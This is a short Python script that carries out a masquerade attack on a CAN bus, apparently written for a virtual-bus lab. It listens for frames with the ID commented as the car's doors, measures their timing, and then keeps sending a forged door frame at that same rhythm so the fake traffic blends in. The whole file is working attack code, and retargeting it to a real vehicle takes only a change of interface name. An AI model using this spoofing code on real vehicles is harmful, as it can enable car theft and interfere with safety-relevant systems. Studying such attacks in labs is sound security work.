import can
import time

CAN_INTERFACE = "vcan0"  
ID = 0x19b #doors ID  

def takeTime(bus, t, id):

    start_time = time.time()
    timestamps = []

    try:
        while time.time()- start_time < t:
            msg = bus.recv(timeout=1) # will wait 1 sec to receive a message
            if msg is not None and msg.arbitration_id == id:
                timestamps.append(msg.timestamp)

            elapsed = time.time() - start_time
            print(f"Remaining time: {t - elapsed:.1f} sec", end="\r")

    except Exception as e:
        print("exception")
    
    sumDif = 0
    for i in range(1, len(timestamps)):
        sumDif += timestamps[i] - timestamps[i-1]
    return sumDif/(len(timestamps) - 1), timestamps[-1]

def masq_attack(bus):

    distance, lastTs = takeTime(bus, 20, ID)

    data = [0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]
    msg = can.Message(arbitration_id=ID,  data = data, is_extended_id = False)

    try:
        while True:
            current_time = time.time()
            if current_time >= lastTs + distance:
                lastTs += distance 
                bus.send(msg)
                print(f"Fab msg: {msg}")

    except KeyboardInterrupt:
        print("Interrupted by keyboard")
    except can.CanError as e:
        print(f"CAN error: {e}")

if __name__ == "__main__":
    with can.interface.Bus(channel=CAN_INTERFACE, bustype="socketcan") as bus:
        masq_attack(bus)